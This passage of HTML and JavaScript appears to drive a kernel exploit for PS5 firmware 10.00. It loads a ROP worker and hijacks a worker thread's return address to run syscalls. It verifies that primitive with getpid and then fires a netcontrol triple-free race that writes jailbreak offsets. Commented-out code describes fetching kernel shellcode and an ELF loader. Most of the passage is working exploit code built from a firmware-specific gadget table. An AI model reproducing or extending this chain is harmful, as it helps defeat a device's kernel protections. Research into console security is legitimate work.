    // ROP executor, which the netcontrol port does not use - it builds its own
    // thr_new chain from gadgets verified against this firmware.
    mark("POOPS-SELFTEST-SKIPPED", "port-is-self-contained");

    /* rop-worker must load BEFORE runtimeStatus(): netctrl-ps5 now issues
       every syscall through rop_worker.syscallSync, so syscallGaps() counts a
       missing runner as a gap. Loading it afterwards made status report
       ready=false / missing=none and bail before the run block. */
    try {
        mark("ROPW-LOAD");
        await loadScript("rop-worker.js");
    } catch (e) {
        mark("ROPW-LOAD-FAILED", String(e && e.message).slice(0, 80));
    }

    // --- kernel stage: sys_netcontrol instead of Y2JB's aio lapse.js ----
    try {
        const st = window.netctrl_ps5.runtimeStatus();
        mark("NETCTRL-STATUS", "ready=" + st.ready);
        report("netctrl_status", {
            ready: st.ready ? 1 : 0,
            missing: st.missing.join("+") || "none",
            syscalls: st.syscalls_known,
            gadgets: st.gadgets,
            fw: st.fw,
            wk: st.webkit_base,
            lk: st.kernel_base,
            needs_libc: st.needs_libc ? 1 : 0
        });
        if (!st.ready) {
            mark("NETCTRL-RUNTIME-INCOMPLETE");
            return;
        }
    } catch (e) {
        report("netctrl_status", {error: String(e && e.message).slice(0, 120)});
        return;
    }

    /* DISARMED 2026-08-07. netctrl_ps5.run() is NOT the thing to test right
       now: it dies at its first syscall because lapse-runtime's runChain is
       fatal on 10.00 (getpid, 0 args, kills the renderer - the kernel is
       innocent, Xfast_syscall never dereferences the user RSP). Firing it
       again would only reproduce a failure we have already localised.
       The jailbreak offsets it writes remain RE-verified; see
       reference_netctrl_jailbreak_offsets.md. Re-arm once a working chain
       runner exists. */
    window.NETCTRL_AUTORUN = 0;

    /* SURVEY: worker-thread chain runner, discovery only.
       Reads the pthread list, finds the Worker's stack, and scans it for saved
       return addresses. Writes nothing, hijacks nothing - we have no ground
       truth for the return-address slot on 10.00 (umtx2's is a measured
       constant from fw <= 5.50), so this run exists to produce that data. */
    try {
        const sk = window.slopkit || {};
        /* Scratch must NOT come from window.malloc: 0x500 exceeds
           lapse-runtime's 248-byte arena, so malloc takes its slab path, which
           issues an mmap syscall through the very runChain that kills the
           renderer. That one line is what killed the previous survey before it
           reached a single line of its own code.
           Use the arena directly instead - no syscall. Offsets 0x500..0xf00
           were lapse-runtime's ROP_CHAIN region, which is dead space now that
           we no longer use runChain; FAKE_UCOLLATOR (0x100) and the fake
           vtable (0x300) are left untouched because read64/write64 still ride
           the carrier. */
        const scratch = BigInt(sk.arenaBacking) + 0x500n;
        /* Gadgets come from netctrl-ps5's table, which was disassembled at
           every RVA in the devkit's own modules. rop-worker supplies the
           libkernel ones (setjmp/longjmp/pop_rsp/syscall_wrapper) itself. */
        const G = window.netctrl_ps5 && window.netctrl_ps5.gadgetsFor
            ? window.netctrl_ps5.gadgetsFor(String(sk.FW_VERSION || ""))
            : null;
        window.rop_worker.init({
            kernelBase: sk.kernelBase,
            webkitBase: sk.webkitBase,
            gadgets: G || {},
            scratch: scratch,
        });
        mark("ROPW-INIT", "k=" + hex(sk.kernelBase) + " g=" + (G ? "ok" : "MISSING"));
        await window.rop_worker.survey();
        mark("ROPW-SURVEY-DONE");

        /* getpid(): 0 args, side-effect free, number RE-verified. One call
           exercises the entire path - Worker, thread walk, slot hijack, chain,
           syscall, longjmp resume. A plausible pid means the primitive works;
           anything else stops here rather than proceeding to the race. */
        if (G) {
            const r = await window.rop_worker.testGetpid();
            mark("ROPW-GETPID", String(r.retval));
            report("ropw_getpid", {pid: String(r.retval), ms: r.ms});

            /* Same call through the SYNCHRONOUS path (busy-poll, no await).
               If this returns the same pid, netctrl-ps5.js keeps its
               synchronous API and its race timing - no async refactor. */
            try {
                const s = window.rop_worker.testGetpidSync();
                mark("ROPW-GETPID-SYNC", String(s.retval) + "-spins=" + s.spins);
                report("ropw_getpid_sync",
                       {pid: String(s.retval), spins: s.spins,
                        match: String(s.retval === r.retval)});
                /* ARMED. The race only runs once BOTH getpid proofs pass, so a
                   broken primitive stops us before the kernel is touched.
                   netctrl-ps5 now issues every syscall through
                   rop_worker.syscallSync and allocates via get_backing_store -
                   window.syscall / window.call / window.malloc all route to
                   lapse-runtime's runChain, which is fatal on 10.00. */
                if (s.retval === r.retval) {
                    mark("NETCTRL-ARMED", "primitive verified both ways");
                    try {
                        const ok = window.netctrl_ps5.run();
                        mark("NETCTRL-RUN", String(ok));
                        report("netctrl_run", {result: String(ok)});
                        // fire AFTER the +1000ms SURVIVED marker so it is the last
                        // line in the log on any failure that did not throw.
                        if (!ok) setTimeout(function () { mark("REBOOT AND TRY AGAIN"); }, 2000);
                    } catch (e2) {
                        mark("NETCTRL-THREW", String(e2 && e2.message).slice(0, 90));
                        report("netctrl_run", {error: String(e2 && e2.message).slice(0, 140)});
                        setTimeout(function () { mark("REBOOT AND TRY AGAIN"); }, 2000);
                    }
                } else {
                    mark("NETCTRL-NOT-ARMED", "sync/async pid mismatch");
                    setTimeout(function () { mark("REBOOT AND TRY AGAIN"); }, 2000);
                }
            } catch (e) {
                mark("ROPW-SYNC-FAILED", String(e && e.message).slice(0, 80));
                report("ropw_getpid_sync", {error: String(e && e.message).slice(0, 120)});
            }
        } else {
            mark("ROPW-NO-GADGETS", "netctrl_ps5.gadgetsFor missing");
        }
        report("ropw_survey", {done: 1});
    } catch (e) {
        mark("ROPW-THREW", String(e && e.message).slice(0, 90));
        report("ropw_survey", {error: String(e && e.message).slice(0, 120)});
    }
    return;

    /* Beacon every netctrl stage line, not just the screen. The armed run is
       currently dying inside run() with no NETCTRL-RUN and no NETCTRL-THREW,
       i.e. hard enough that the catch below never executes - so the only way
       to see which stage it reached is a synchronous beacon per stage.
       Costs timing fidelity; set to 0 once the failing stage is known. */
    /* TRACE OFF for the armed race. Every stage line is a SYNCHRONOUS XHR,
       which is real interference for a timing-sensitive triple-free - the
       window find_twins is hunting is exactly what a blocking HTTP round trip
       between stages destroys. The phase markers in netctrl.html still report
       (NETCTRL-ARMED / RUN / THREW), so a failure is still localised to a
       phase; only the per-stage NC lines go quiet. Set back to 1 to debug. */
    window.NETCTRL_TRACE = 1;        /* setup phases: beacons ON  */
    window.NETCTRL_TRACE_RACE = 0;   /* race phases:  beacons OFF (timing) */

    if (!window.NETCTRL_AUTORUN) {
        mark("NETCTRL-READY", "set NETCTRL_AUTORUN=1 to fire");
        report("netctrl_ready", {armed: 0});
        return;
    }

    try {
        const ok = window.netctrl_ps5.run();
        mark("NETCTRL-RUN", String(ok));
        report("netctrl_run", {result: String(ok)});
    } catch (e) {
        mark("NETCTRL-THREW", String(e && e.message).slice(0, 80));
        report("netctrl_run", {error: String(e && e.message).slice(0, 120)});
    }
    return;

    // 4. lapse.js is a self-invoking async IIFE — it starts on load.
    //    Stage 5 (ps5_jailbreak) calls load_aioshellcode(), which fetches
    //    kexp_2026_05_25.bin + elfldr-ps5-1360.elf and spawns the
    //    kernel-shellcode thread that installs the ELF loader. There's no
    //    separate elfldr.js call — the aioshellcode handles that end.
    //    We just wait for the JB to complete or time out.
    const startedAt = Date.now();
    const timeoutMs = 5 * 60 * 1000;
    while (true) {
        try {
            if (typeof window.is_jailbroken === "function"
                && window.is_jailbroken()) {
                mark("POOPS-JAILBROKEN");
                break;
            }
        } catch (e) {}
        if (Date.now() - startedAt > timeoutMs) {
            mark("POOPS-TIMEOUT");
            return;
        }
        await new Promise(r => setTimeout(r, 500));
    }
}
</script>
</body>
</html>
